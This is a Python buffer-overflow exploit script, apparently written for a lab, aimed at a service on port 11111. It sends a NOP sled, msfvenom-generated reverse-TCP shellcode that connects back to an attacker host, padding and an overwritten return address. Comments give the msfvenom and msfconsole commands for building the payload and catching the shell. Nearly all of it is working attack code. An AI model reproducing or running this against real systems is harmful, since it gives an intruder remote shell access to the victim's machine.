import socket

# Set host and port of server to be exploited
host = "172.17.0.2"
port = 11111

# Shell code generated for LHOST 172.17.0.4:55555 using
# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=172.17.0.4 LPORT=55555 -b "\x00" -f python >out 
buf =  ""
buf += "\xdb\xc2\xd9\x74\x24\xf4\xb8\xda\x5c\xa7\x3c\x5f\x33"
buf += "\xc9\xb1\x12\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2"
buf += "\x2f\x6d\x7c\xcb\x2c\xdd\xc1\x67\xd8\xe0\x75\xe1\x95"
buf += "\x04\xb8\x6e\x32\x9d\x2b\xc3\x2d\x22\xa8\x73\x4f\x22"
buf += "\x69\x80\xc6\xc3\xe3\xe1\x80\x53\xa5\xba\xb9\xb5\x06"
buf += "\x88\x39\x87\x8e\xab\x39\xf8\x90\xcb\xb0\x1b\x51\x20"
buf += "\xce\x1a\xb1\xbb\x7e\xe1\xfb\x44\x25\x93\xe5\xdc\x6f"
buf += "\xaf\x55\xdd\x42\x30\x6a\x03"

# Craft payload
payload = "\x90"*500 + buf + "A"*386+"BBBB"+"\x90\xD5\xFF\xFF"+ "\x04\x00"

# To set up server for reverse TCP shell, use:
# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 172.17.0.4; set LPORT 55555; run; exit -y"

# Connect to socket and send payload
s = socket.socket()
s.connect((host, port))
s.send(payload)

